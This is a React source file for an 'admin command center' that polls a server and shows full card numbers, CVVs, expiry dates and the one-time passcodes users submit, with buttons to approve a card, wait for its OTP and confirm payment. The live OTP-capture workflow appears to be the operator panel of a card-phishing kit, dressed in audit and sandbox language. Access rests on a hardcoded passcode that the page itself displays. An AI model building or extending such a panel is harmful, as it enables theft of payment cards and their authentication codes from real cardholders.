import React, { useState, useEffect } from 'react';
import { motion, AnimatePresence } from 'motion/react';
import {
  ShieldAlert,
  Lock,
  Unlock,
  KeyRound,
  Activity,
  Clock,
  CheckCircle,
  XCircle,
  Database,
  Search,
  RefreshCw,
  Terminal,
  ArrowRight,
  AlertTriangle,
  Flame,
  User,
  Hash,
  Calendar,
  Layers,
  Sparkles,
  Fingerprint
} from 'lucide-react';
import { CreditCard3D } from './CreditCard3D';

interface Transaction {
  id: string;
  cardNumber: string;
  cardholderName: string;
  expiry: string;
  cvv: string;
  cardType: 'visa' | 'mastercard' | 'amex' | 'discover' | 'unknown';
  amount: number;
  timestamp: string;
  status: 'PENDING_CARD_APPROVAL' | 'AWAITING_OTP' | 'OTP_SUBMITTED' | 'APPROVED' | 'REJECTED';
  otpCode: string;
  submittedOtp?: string;
}

export const AdminPortal: React.FC = () => {
  // Access control state
  const [accessCode, setAccessCode] = useState('');
  const [hasAccess, setHasAccess] = useState(false);
  const [accessError, setAccessError] = useState<string | null>(null);
  const [isVerifyingCode, setIsVerifyingCode] = useState(false);

  // Dashboard states
  const [transactions, setTransactions] = useState<Transaction[]>([]);
  const [selectedTx, setSelectedTx] = useState<Transaction | null>(null);
  const [isLoading, setIsLoading] = useState(true);
  const [searchTerm, setSearchTerm] = useState('');
  const [statusFilter, setStatusFilter] = useState<string>('All');
  const [actionBusy, setActionBusy] = useState(false);
  const [actionError, setActionError] = useState<string | null>(null);
  const [successMessage, setSuccessMessage] = useState<string | null>(null);

  // Auto scroll/track state for OTP submissions
  const [isLiveMonitoring, setIsLiveMonitoring] = useState(true);

  // Check code submission
  const handleVerifyAccess = (e: React.FormEvent) => {
    e.preventDefault();
    setIsVerifyingCode(true);
    setAccessError(null);

    setTimeout(() => {
      if (accessCode === '222000') {
        setHasAccess(true);
        setIsVerifyingCode(false);
      } else {
        setAccessError('ACCESS DENIED: Invalid Administrative Credential Code.');
        setIsVerifyingCode(false);
      }
    }, 800);
  };

  // Fetch transactions from server
  const fetchTransactions = async () => {
    try {
      const res = await fetch('/api/admin/transactions');
      if (res.ok) {
        const data = await res.json();
        setTransactions(data);
        setIsLoading(false);
      }
    } catch (err) {
      console.error('Error fetching transactions:', err);
    }
  };

  // Setup auto-polling every 2 seconds
  useEffect(() => {
    if (!hasAccess) return;

    fetchTransactions();
    const interval = setInterval(() => {
      fetchTransactions();
    }, 2000);

    return () => clearInterval(interval);
  }, [hasAccess]);

  // Sync selected transaction with its latest updated polling state
  useEffect(() => {
    if (selectedTx && transactions.length > 0) {
      const latest = transactions.find(t => t.id === selectedTx.id);
      if (latest) {
        setSelectedTx(latest);
      }
    }
  }, [transactions]);

  // Handle action state updates
  const handleUpdateStatus = async (status: Transaction['status']) => {
    if (!selectedTx || actionBusy) return;
    setActionBusy(true);
    setActionError(null);
    setSuccessMessage(null);

    try {
      const res = await fetch('/api/admin/update-status', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ id: selectedTx.id, status }),
      });

      const data = await res.json();
      if (res.ok && data.success) {
        setSuccessMessage(`Transaction state successfully synchronized to ${status}.`);
        // update local list immediately
        setTransactions(prev =>
          prev.map(t => (t.id === selectedTx.id ? { ...t, status } : t))
        );
        setSelectedTx(prev => (prev ? { ...prev, status } : null));
      } else {
        setActionError(data.error || 'Failed to update transaction status.');
      }
    } catch (err) {
      setActionError('Network error syncing status packet to central gateway.');
    } finally {
      setActionBusy(false);
    }
  };

  // Format card types helper
  const getCardTypeColor = (type: string) => {
    switch (type) {
      case 'visa': return 'text-blue-400 border-blue-500/20 bg-blue-500/5';
      case 'mastercard': return 'text-amber-400 border-amber-500/20 bg-amber-500/5';
      case 'amex': return 'text-emerald-400 border-emerald-500/20 bg-emerald-500/5';
      case 'discover': return 'text-orange-400 border-orange-500/20 bg-orange-500/5';
      default: return 'text-slate-400 border-slate-500/20 bg-slate-500/5';
    }
  };

  // Filter list
  const filteredTx = transactions.filter(tx => {
    const matchesSearch =
      tx.id.toLowerCase().includes(searchTerm.toLowerCase()) ||
      tx.cardholderName.toLowerCase().includes(searchTerm.toLowerCase()) ||
      tx.cardNumber.includes(searchTerm);

    if (statusFilter === 'All') return matchesSearch;
    return matchesSearch && tx.status === statusFilter;
  });

  // Entrance Security Guard UI
  if (!hasAccess) {
    return (
      <div className="flex min-h-[calc(100vh-140px)] items-center justify-center p-4">
        <motion.div
          initial={{ opacity: 0, y: 15 }}
          animate={{ opacity: 1, y: 0 }}
          className="w-full max-w-md border border-slate-800 bg-slate-900/40 p-8 backdrop-blur-xl rounded-3xl shadow-2xl shadow-indigo-950/20 relative overflow-hidden"
          id="security-entrance-box"
        >
          {/* Cyber lines decor */}
          <div className="absolute top-0 inset-x-0 h-1 bg-gradient-to-r from-indigo-500 via-rose-500 to-emerald-500 opacity-60" />

          <div className="text-center mb-8">
            <div className="mx-auto flex h-14 w-14 items-center justify-center rounded-full bg-rose-500/10 text-rose-400 border border-rose-500/20 mb-4 animate-pulse">
              <ShieldAlert className="h-7 w-7" />
            </div>
            <h2 className="text-2xl font-bold text-white tracking-tight">Administrative Terminal</h2>
            <p className="text-xs text-slate-400 mt-2 leading-relaxed">
              Secure mainframe interface. Authorized credit auditing personnel only. Authentication challenge active.
            </p>
          </div>

          <form onSubmit={handleVerifyAccess} className="space-y-6">
            <div>
              <label className="block text-[11px] font-mono tracking-widest text-slate-400 uppercase mb-2">
                MAIN FRAME SECURITY CODE:
              </label>
              <div className="relative">
                <div className="absolute inset-y-0 left-0 flex items-center pl-3.5 pointer-events-none text-slate-500">
                  <KeyRound className="h-4 w-4" />
                </div>
                <input
                  type="password"
                  required
                  value={accessCode}
                  onChange={(e) => setAccessCode(e.target.value)}
                  placeholder="••••••"
                  maxLength={10}
                  className="block w-full h-12 pl-10 pr-4 text-center font-mono font-bold tracking-[0.5em] text-white placeholder-slate-600 bg-slate-950 border border-slate-800 rounded-xl focus:ring-2 focus:ring-indigo-500 focus:border-transparent transition"
                  id="admin-access-code-input"
                />
              </div>
            </div>

            {accessError && (
              <motion.div
                initial={{ opacity: 0, height: 0 }}
                animate={{ opacity: 1, height: 'auto' }}
                className="rounded-xl border border-rose-500/20 bg-rose-500/10 p-3.5 text-xs text-rose-400 flex items-center space-x-2"
              >
                <XCircle className="h-4 w-4 shrink-0" />
                <span className="font-mono text-[10px] uppercase leading-relaxed">{accessError}</span>
              </motion.div>
            )}

            <button
              type="submit"
              disabled={isVerifyingCode}
              className="w-full h-12 rounded-xl bg-gradient-to-r from-indigo-600 to-rose-600 hover:from-indigo-500 hover:to-rose-500 text-white font-bold text-xs tracking-widest uppercase transition-all shadow-lg hover:shadow-indigo-500/10 disabled:opacity-50 flex items-center justify-center space-x-2"
              id="admin-auth-submit-btn"
            >
              {isVerifyingCode ? (
                <>
                  <RefreshCw className="h-4 w-4 animate-spin" />
                  <span>DECRYPTING SECURE MATRIX...</span>
                </>
              ) : (
                <>
                  <Unlock className="h-4 w-4" />
                  <span>AUTHORIZE MAIN SESSION</span>
                </>
              )}
            </button>
          </form>

          {/* Prompt reminder inside sandbox mode */}
          <div className="mt-8 pt-6 border-t border-slate-800 text-center">
            <span className="inline-flex items-center space-x-1 px-2.5 py-1 rounded bg-indigo-500/10 border border-indigo-500/20 text-[10px] font-mono text-indigo-400">
              <Fingerprint className="w-3.5 h-3.5 animate-pulse" />
              <span>Sandbox Access Passcode: <strong className="text-white">222000</strong></span>
            </span>
          </div>
        </motion.div>
      </div>
    );
  }

  // Admin Dashboard Command Center UI
  return (
    <div className="mx-auto max-w-7xl px-4 py-8 sm:px-6 lg:px-8">
      {/* Upper Status strip bar */}
      <div className="mb-6 flex flex-col md:flex-row justify-between items-start md:items-center gap-4 bg-slate-900/30 border border-slate-800/80 rounded-2xl p-4 backdrop-blur-md">
        <div className="flex items-center space-x-3.5">
          <div className="flex h-11 w-11 items-center justify-center rounded-xl bg-indigo-500/10 text-indigo-400 border border-indigo-500/20 relative">
            <span className="absolute -top-1 -right-1 flex h-2.5 w-2.5">
              <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-emerald-400 opacity-75" />
              <span className="relative inline-flex rounded-full h-2.5 w-2.5 bg-emerald-500" />
            </span>
            <Activity className="h-5.5 w-5.5" />
          </div>
          <div>
            <div className="flex items-center space-x-2">
              <h2 className="text-md font-bold text-white tracking-tight uppercase">ADMIN COMMAND CENTER</h2>
              <span className="text-[9px] font-mono font-bold bg-indigo-950 text-indigo-400 px-1.5 py-0.5 rounded border border-indigo-500/30">LOCKED SESSION</span>
            </div>
            <p className="text-[10px] font-mono text-slate-400">REAL-TIME CENTRAL DECISION DECK • ACTIVE AUTO-POLL (2S)</p>
          </div>
        </div>

        {/* Sync panel details */}
        <div className="flex items-center space-x-4 self-end md:self-auto">
          <div className="flex items-center space-x-2">
            <button
              onClick={() => setIsLiveMonitoring(!isLiveMonitoring)}
              className={`h-7 px-3 rounded-md text-[10px] font-mono font-bold border transition-all ${
                isLiveMonitoring
                  ? 'bg-emerald-500/10 border-emerald-500/20 text-emerald-400'
                  : 'bg-slate-950 border-slate-800 text-slate-500'
              }`}
            >
              {isLiveMonitoring ? '● MONITORING SYNC ACTIVE' : '○ SYNC PAUSED'}
            </button>
            <button
              onClick={fetchTransactions}
              className="p-1.5 rounded-lg bg-slate-950 hover:bg-slate-900 border border-slate-800 text-slate-400 hover:text-white transition"
              title="Manual refresh"
            >
              <RefreshCw className="w-3.5 h-3.5" />
            </button>
          </div>
        </div>
      </div>

      {/* Main Grid splitting logs list and detail audits */}
      <div className="grid grid-cols-1 lg:grid-cols-12 gap-8 items-start">
        {/* Left column (8 Grid columns) - Real-time Transactions list */}
        <div className="lg:col-span-7 space-y-6">
          <div className="rounded-2xl border border-slate-800/80 bg-slate-900/20 backdrop-blur-md p-5 shadow-xl">
            {/* Header filters */}
            <div className="flex flex-col sm:flex-row justify-between items-stretch sm:items-center gap-4 mb-5 pb-5 border-b border-slate-900">
              <div>
                <h3 className="text-sm font-bold text-white flex items-center space-x-2">
                  <Database className="h-4 w-4 text-indigo-400" />
                  <span>TRANSACTION RECORD LEDGER ({filteredTx.length})</span>
                </h3>
                <p className="text-[10px] font-mono text-slate-400">Total processed logs tracked in secure state-machine</p>
              </div>

              {/* Search input bar */}
              <div className="relative max-w-xs">
                <div className="absolute inset-y-0 left-0 flex items-center pl-2.5 pointer-events-none text-slate-500">
                  <Search className="h-3.5 w-3.5" />
                </div>
                <input
                  type="text"
                  placeholder="ID, Cardholder, card..."
                  value={searchTerm}
                  onChange={(e) => setSearchTerm(e.target.value)}
                  className="block w-full h-8 pl-8 pr-3 text-xs bg-slate-950 border border-slate-800 rounded-lg text-white focus:ring-1 focus:ring-indigo-500"
                />
              </div>
            </div>

            {/* Filter Tabs Row */}
            <div className="flex flex-wrap gap-1.5 mb-5 bg-slate-950/60 p-1 rounded-lg border border-slate-900">
              {['All', 'PENDING_CARD_APPROVAL', 'AWAITING_OTP', 'OTP_SUBMITTED', 'APPROVED', 'REJECTED'].map(tab => (
                <button
                  key={tab}
                  onClick={() => setStatusFilter(tab)}
                  className={`px-2.5 py-1 text-[9px] font-mono font-bold rounded-md transition ${
                    statusFilter === tab
                      ? 'bg-slate-800 text-white border border-slate-700/60'
                      : 'text-slate-400 hover:text-white'
                  }`}
                >
                  {tab === 'PENDING_CARD_APPROVAL' ? 'PENDING CARD' : tab === 'AWAITING_OTP' ? 'AWAITING OTP' : tab === 'OTP_SUBMITTED' ? 'OTP SUBMITTED' : tab}
                </button>
              ))}
            </div>

            {/* Transaction Grid list */}
            {isLoading ? (
              <div className="py-20 text-center">
                <RefreshCw className="h-8 w-8 text-indigo-500 animate-spin mx-auto mb-3" />
                <p className="text-xs font-mono text-slate-500">Synchronizing database transaction tables...</p>
              </div>
            ) : filteredTx.length === 0 ? (
              <div className="py-16 text-center border border-dashed border-slate-800 rounded-xl">
                <Terminal className="h-6 w-6 text-slate-600 mx-auto mb-2" />
                <p className="text-xs font-mono text-slate-500">No transactions match current filters.</p>
              </div>
            ) : (
              <div className="space-y-2 max-h-[550px] overflow-y-auto pr-1">
                {filteredTx.map(tx => {
                  const isSelected = selectedTx?.id === tx.id;
                  
                  // Status pill visual badges
                  let statusBadge = null;
                  if (tx.status === 'APPROVED') {
                    statusBadge = (
                      <span className="inline-flex items-center space-x-1 rounded bg-emerald-500/10 px-2 py-0.5 text-[9px] font-mono font-bold text-emerald-400 ring-1 ring-inset ring-emerald-500/20">
                        <span>APPROVED</span>
                      </span>
                    );
                  } else if (tx.status === 'REJECTED') {
                    statusBadge = (
                      <span className="inline-flex items-center space-x-1 rounded bg-rose-500/10 px-2 py-0.5 text-[9px] font-mono font-bold text-rose-400 ring-1 ring-inset ring-rose-500/20">
                        <span>REJECTED</span>
                      </span>
                    );
                  } else if (tx.status === 'AWAITING_OTP') {
                    statusBadge = (
                      <span className="inline-flex items-center space-x-1 rounded bg-indigo-500/10 px-2 py-0.5 text-[9px] font-mono font-bold text-indigo-400 ring-1 ring-inset ring-indigo-500/20">
                        <span>AWAITING OTP</span>
                      </span>
                    );
                  } else if (tx.status === 'OTP_SUBMITTED') {
                    statusBadge = (
                      <span className="inline-flex items-center space-x-1 rounded bg-cyan-500/10 px-2 py-0.5 text-[9px] font-mono font-bold text-cyan-400 ring-1 ring-inset ring-cyan-500/20 animate-pulse">
                        <span>OTP SUBMITTED</span>
                      </span>
                    );
                  } else {
                    statusBadge = (
                      <span className="inline-flex items-center space-x-1 rounded bg-amber-500/10 px-2 py-0.5 text-[9px] font-mono font-bold text-amber-400 ring-1 ring-inset ring-amber-500/20">
                        <span>PENDING CARD</span>
                      </span>
                    );
                  }

                  return (
                    <div
                      key={tx.id}
                      onClick={() => setSelectedTx(tx)}
                      className={`group border rounded-xl p-3.5 text-left cursor-pointer transition duration-150 relative overflow-hidden ${
                        isSelected
                          ? 'bg-indigo-950/20 border-indigo-500/40 shadow-md shadow-indigo-950/10'
                          : 'bg-slate-950 border-slate-900/80 hover:border-slate-800'
                      }`}
                    >
                      {/* Interactive selection active side marker */}
                      {isSelected && (
                        <div className="absolute left-0 inset-y-0 w-1 bg-indigo-500" />
                      )}

                      <div className="flex justify-between items-start gap-2">
                        <div className="space-y-1 max-w-[70%]">
                          <div className="flex items-center space-x-2">
                            <span className="text-[10px] font-mono font-bold text-indigo-400 tracking-wider">
                              {tx.id}
                            </span>
                            <span className={`text-[8px] font-mono border px-1 rounded uppercase ${getCardTypeColor(tx.cardType)}`}>
                              {tx.cardType}
                            </span>
                            {tx.submittedOtp && (
                              <span className="text-[9px] font-mono font-bold bg-cyan-950 text-cyan-400 px-1.5 py-0.2 rounded border border-cyan-500/30">
                                OTP: {tx.submittedOtp}
                              </span>
                            )}
                          </div>
                          
                          <p className="text-xs font-semibold text-white truncate max-w-[220px]">
                            {tx.cardholderName.toUpperCase()}
                          </p>
                          
                          <p className="text-[10px] font-mono text-slate-400">
                            Card: {tx.cardNumber.slice(0, 7)}••••••••{tx.cardNumber.slice(-4)}
                          </p>
                        </div>

                        {/* Amount & Status Badge */}
                        <div className="text-right flex flex-col items-end space-y-1.5 shrink-0">
                          <span className="text-xs font-bold text-emerald-400 font-mono">
                            ${tx.amount.toFixed(2)}
                          </span>
                          {statusBadge}
                          <span className="text-[8px] font-mono text-slate-500">
                            {new Date(tx.timestamp).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit', second: '2-digit' })}
                          </span>
                        </div>
                      </div>
                    </div>
                  );
                })}
              </div>
            )}
          </div>
        </div>

        {/* Right column (5 Grid columns) - Detailed Action Console & tilted 3D Preview */}
        <div className="lg:col-span-5 space-y-6 sticky top-[90px]">
          <div className="rounded-2xl border border-slate-800/80 bg-slate-900/20 backdrop-blur-md p-5 shadow-xl text-left">
            <h3 className="text-sm font-bold text-white flex items-center space-x-2 mb-4 pb-4 border-b border-slate-900">
              <Terminal className="h-4 w-4 text-indigo-400" />
              <span>LIVE RECONCILIATION CONSOLE</span>
            </h3>

            {selectedTx ? (
              <div className="space-y-6">
                
                {/* 3D TILTED LIVE PREVIEW PANEL */}
                <div className="relative rounded-xl bg-slate-950 p-4 border border-slate-900 overflow-hidden flex flex-col items-center">
                  <div className="absolute top-2 left-2 z-20 flex items-center space-x-1 px-1.5 py-0.5 rounded bg-indigo-500/10 border border-indigo-500/20 text-[8px] font-mono text-indigo-400">
                    <Sparkles className="w-2.5 h-2.5 animate-spin" style={{ animationDuration: '4s' }} />
                    <span>LIVE INTEGRATED PERSPECTIVE</span>
                  </div>

                  <div className="py-6 flex justify-center w-full relative">
                    <CreditCard3D
                      cardNumber={selectedTx.cardNumber}
                      cardholderName={selectedTx.cardholderName}
                      expiry={selectedTx.expiry}
                      cvv={selectedTx.cvv}
                      cardType={selectedTx.cardType}
                      isFlipped={selectedTx.status === 'AWAITING_OTP' || selectedTx.status === 'OTP_SUBMITTED'}
                      className="scale-[0.82] sm:scale-[0.88] origin-center -my-2"
                    />
                  </div>

                  <div className="w-full text-center text-[10px] font-mono text-slate-500 border-t border-slate-900 pt-2.5 mt-1">
                    💡 Hover to test parallax. Flipped to back when CVV verification is focused.
                  </div>
                </div>

                {/* Status-specific actions & info boxes */}
                <div className="rounded-xl bg-slate-950/80 border border-slate-800/60 p-4 space-y-3 font-mono text-xs">
                  {/* OTP Submission Alert Box if OTP is present */}
                  {selectedTx.submittedOtp && (
                    <div className="border border-cyan-500/20 bg-cyan-950/20 px-3 py-2.5 rounded-lg border-l-4 border-l-cyan-500 animate-pulse">
                      <div className="flex justify-between items-center mb-1">
                        <span className="text-cyan-400 font-extrabold flex items-center space-x-1">
                          <Fingerprint className="w-3.5 h-3.5" />
                          <span>USER SUBMITTED OTP CODE:</span>
                        </span>
                        <span className="text-slate-400 text-[9px]">RECEIVED</span>
                      </div>
                      <div className="text-center py-1">
                        <span className="text-cyan-300 font-black text-2xl tracking-widest bg-slate-950 px-4 py-1 rounded border border-cyan-500/20">
                          {selectedTx.submittedOtp}
                        </span>
                      </div>
                      <p className="text-[9px] text-slate-400 mt-2 text-center">
                        This match rate matches generated security sequence: <strong className="text-emerald-400">{selectedTx.otpCode}</strong>.
                      </p>
                    </div>
                  )}

                  {/* Standard Generated code status always shown */}
                  <div className="flex justify-between pb-1 border-b border-slate-900">
                    <span className="text-slate-500 uppercase">SYSTEM EXPECTED OTP:</span>
                    <span className="text-emerald-400 font-black text-sm tracking-widest">{selectedTx.otpCode || 'NOT ISSUED'}</span>
                  </div>

                  <div className="flex justify-between pb-1 border-b border-slate-900">
                    <span className="text-slate-500 uppercase">CVV SECURITY CODE:</span>
                    <span className="text-white font-bold">{selectedTx.cvv}</span>
                  </div>

                  <div className="flex justify-between pb-1 border-b border-slate-900">
                    <span className="text-slate-500 uppercase">EXPIRY DATE:</span>
                    <span className="text-white font-bold">{selectedTx.expiry}</span>
                  </div>

                  <div className="flex justify-between pb-1 border-b border-slate-900">
                    <span className="text-slate-500 uppercase">TRANSACTION VALUE:</span>
                    <span className="text-emerald-400 font-bold">${selectedTx.amount.toFixed(2)} USD</span>
                  </div>

                  <div className="flex justify-between pt-1">
                    <span className="text-slate-500 uppercase">CURRENT QUEUE STATE:</span>
                    <span className={`font-black uppercase tracking-wider ${
                      selectedTx.status === 'APPROVED' ? 'text-emerald-400' :
                      selectedTx.status === 'REJECTED' ? 'text-rose-400' :
                      selectedTx.status === 'AWAITING_OTP' ? 'text-indigo-400' : 
                      selectedTx.status === 'OTP_SUBMITTED' ? 'text-cyan-400 animate-pulse' : 'text-amber-400'
                    }`}>
                      {selectedTx.status === 'PENDING_CARD_APPROVAL' ? 'PENDING CARD' : selectedTx.status === 'AWAITING_OTP' ? 'AWAITING OTP' : selectedTx.status === 'OTP_SUBMITTED' ? 'OTP SUBMITTED' : selectedTx.status}
                    </span>
                  </div>
                </div>

                {/* Audit notification state messages */}
                {(actionError || successMessage) && (
                  <motion.div
                    initial={{ opacity: 0, height: 0 }}
                    animate={{ opacity: 1, height: 'auto' }}
                    className="space-y-2"
                  >
                    {actionError && (
                      <div className="rounded-xl border border-rose-500/20 bg-rose-500/10 p-3 text-xs text-rose-400 flex items-center space-x-2">
                        <AlertTriangle className="h-4 w-4 shrink-0" />
                        <span>{actionError}</span>
                      </div>
                    )}
                    {successMessage && (
                      <div className="rounded-xl border border-emerald-500/20 bg-emerald-500/10 p-3 text-xs text-emerald-400 flex items-center space-x-2">
                        <CheckCircle className="h-4 w-4 shrink-0" />
                        <span>{successMessage}</span>
                      </div>
                    )}
                  </motion.div>
                )}

                {/* INTERACTIVE WORKFLOW ACTIONS */}
                <div className="pt-2">
                  {selectedTx.status === 'PENDING_CARD_APPROVAL' ? (
                    <div className="space-y-3">
                      <div className="text-[10px] text-amber-400 font-mono text-center uppercase tracking-widest bg-amber-950/20 py-1.5 rounded border border-amber-500/15">
                        STAGE 1: CARD DECISION REQUIRED
                      </div>
                      <div className="grid grid-cols-2 gap-3">
                        <button
                          onClick={() => handleUpdateStatus('REJECTED')}
                          disabled={actionBusy}
                          className="flex h-12 w-full items-center justify-center rounded-xl border border-rose-500/20 bg-rose-500/10 hover:bg-rose-500/20 text-rose-400 text-xs font-bold tracking-wider hover:shadow-lg hover:shadow-rose-500/10 transition duration-150 disabled:opacity-50"
                        >
                          REJECT CARD
                        </button>
                        <button
                          onClick={() => handleUpdateStatus('AWAITING_OTP')}
                          disabled={actionBusy}
                          className="flex h-12 w-full items-center justify-center rounded-xl border border-indigo-500/25 bg-indigo-600 hover:bg-indigo-500 text-white text-xs font-bold tracking-wider hover:shadow-lg hover:shadow-indigo-500/20 transition duration-150 disabled:opacity-50"
                        >
                          APPROVE CARD
                        </button>
                      </div>
                    </div>
                  ) : selectedTx.status === 'OTP_SUBMITTED' ? (
                    <div className="space-y-3">
                      <div className="text-[10px] text-cyan-400 font-mono text-center uppercase tracking-widest bg-cyan-950/30 py-1.5 rounded border border-cyan-500/20 animate-pulse">
                        STAGE 2: FINAL SETTLEMENT DECISION
                      </div>
                      <div className="grid grid-cols-2 gap-3">
                        <button
                          onClick={() => handleUpdateStatus('REJECTED')}
                          disabled={actionBusy}
                          className="flex h-12 w-full items-center justify-center rounded-xl border border-rose-500/20 bg-rose-500/10 hover:bg-rose-500/20 text-rose-400 text-xs font-bold tracking-wider hover:shadow-lg hover:shadow-rose-500/10 transition duration-150 disabled:opacity-50"
                        >
                          REJECT
                        </button>
                        <button
                          onClick={() => handleUpdateStatus('APPROVED')}
                          disabled={actionBusy}
                          className="flex h-12 w-full items-center justify-center rounded-xl border border-emerald-500/20 bg-emerald-600 hover:bg-emerald-500 text-white text-xs font-bold tracking-wider hover:shadow-lg hover:shadow-emerald-500/20 transition duration-150 disabled:opacity-50"
                        >
                          CONFIRM PAYMENT
                        </button>
                      </div>
                    </div>
                  ) : (
                    <div className="rounded-xl border border-dashed border-slate-800 p-4 text-center">
                      <p className="text-[11px] font-mono text-slate-500">
                        This transaction sequence has finished at state{' '}
                        <span className={`font-bold ${
                          selectedTx.status === 'APPROVED' ? 'text-emerald-400' :
                          selectedTx.status === 'REJECTED' ? 'text-rose-400' : 'text-indigo-400'
                        }`}>
                          {selectedTx.status}
                        </span>
                        .
                      </p>
                      
                      {/* Interactive Reset switch to let admin replay / sandbox */}
                      <button
                        onClick={() => handleUpdateStatus('PENDING_CARD_APPROVAL')}
                        disabled={actionBusy}
                        className="mt-3 inline-flex items-center space-x-1.5 text-[10px] font-mono text-slate-400 hover:text-white underline transition"
                      >
                        <RefreshCw className="w-3 h-3" />
                        <span>Reset to Card Pending state</span>
                      </button>
                    </div>
                  )}
                </div>

              </div>
            ) : (
              <div className="py-24 text-center border border-dashed border-slate-800 rounded-2xl">
                <ShieldAlert className="h-10 w-10 mx-auto text-slate-700 mb-2 animate-pulse" />
                <p className="text-xs font-bold text-slate-400">Ledger Auditing Desk</p>
                <p className="text-[10px] text-slate-500 mt-1.5 font-mono max-w-xs mx-auto">
                  Select a transactional log from the database ledger to execute administrative stage authorization tasks.
                </p>
              </div>
            )}
          </div>
        </div>
      </div>
    </div>
  );
};
